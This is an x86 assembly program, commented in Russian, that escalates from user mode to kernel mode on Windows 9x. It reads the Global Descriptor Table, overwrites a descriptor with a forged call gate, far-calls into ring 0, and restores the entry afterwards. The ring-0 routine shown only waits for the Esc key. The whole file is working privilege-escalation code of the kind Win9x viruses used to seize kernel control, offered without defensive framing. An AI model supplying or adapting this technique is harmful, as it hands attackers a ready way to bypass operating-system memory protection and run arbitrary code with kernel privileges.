; Переход в нулевое кольцо под Win9x 
; Метод: GDT (Global Descriptor Table, таблица глобальных дескрипторов)

.586p
.model flat

callW           macro   x
                extern  x:PROC
                call    x
                endm

.data

_Start:
                pusha

                call    __pop1          ; ставим SEH

                mov     esp, [esp+8]
                jmp     __exit

__pop1:         push    dword ptr fs:[0]
                mov     fs:[0], esp

                call    __pop2          ; получить адрес callgate-а

                call    ring0_proc      ; вызывается в ring-0
                retf                    ; здесь RETF -- обратно в ring3

__pop2:         pop     ESI             ; ESI=адрес callgate-а

                push    EDI             ; получить адрес 1-го дескриптора
                sgdt    [esp-2]         ; GDT (нулевой не используется)
                pop     EDI
                add     EDI, 8

                fild    qword ptr [EDI] ; сохранить дескриптор

                mov     EAX, ESI        ; создать дескриптор callgate-а
                cld
                stosw
                mov     EAX, 1110110000000000b shl 16 + 28h
                stosd
                shld    EAX, ESI, 16
                stosw

                db      9Ah             ; вызов callgate-а
                dd      0
                dw      1*8+11b         ; sel.#8, GDT, ring-3

                fistp   qword ptr [EDI-8] ; восстановить дескриптор

__exit:         pop     dword ptr fs:[0] ; SEH
                pop     EAX

                popa
                ret

; код в нулевом кольце!
ring0_proc:                                ; r0 start
                push    ss ss
                pop     ds es

                pushad

; Ждем нажатия Esc
WaitESC:                                   
                in        AL, 60h
                cmp       AL, 1
                jne       WaitESC

                popad
                retn                       ; r0 end
.code

start:
                call        _Start
exit:
                push        00000000h
                callW       ExitProcess
end start